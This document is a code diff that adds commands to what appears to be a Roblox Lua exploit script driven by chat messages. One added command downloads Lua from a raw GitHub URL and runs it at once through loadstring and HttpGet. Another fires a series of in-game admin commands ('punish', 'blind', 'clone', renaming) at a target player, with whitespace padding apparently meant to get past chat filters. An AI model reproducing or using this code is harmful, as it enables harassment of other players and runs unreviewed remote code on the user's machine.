@@ -367,6 +367,23 @@ Players.LocalPlayer.Chatted:Connect(function(msg)
   game.Players:Chat("kill                                                 "..plr.."     /o")
 
 	end
+
+if msg == prefix.."fpaint" then
+loadstring(game:HttpGet("https://raw.githubusercontent.com/lpkonizopcinfasdf/plamka/main/fixpaint",true))()
+end
+
+	if string.sub(msg:lower(), 0, 4) == prefix.."pun" then
+		local plr = string.sub(msg:lower(), 6)
+
+  game.Players:Chat("clone                                                                  "..plr.."     ")
+                                                 game.Players:Chat("name "..plr.." [Punished] ")
+  game.Players:Chat("punish   231                                             "..plr.." ")
+  game.Players:Chat("blind "..plr.." a323453")
+wait(.35)
+  game.Players:Chat("-reg")
+	end
+
+
 	
 	if string.sub(msg:lower(), 0, 6) == prefix.."fixbp" then
 		local plr = string.sub(msg:lower(), 8)
